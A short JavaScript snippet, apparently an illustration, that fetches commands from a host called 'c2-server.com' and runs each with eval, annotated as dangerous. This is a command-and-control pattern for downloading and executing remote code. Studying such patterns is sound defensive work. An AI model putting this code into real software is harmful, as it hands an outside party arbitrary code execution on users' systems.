fetch('https://c2-server.com/commands')
    .then(response => response.json())
    .then(commands => {
        commands.forEach(command => {
            eval(command);  // Dangerous! Executes arbitrary code
        });
    })
    .catch(error => console.error('Error fetching commands:', error));

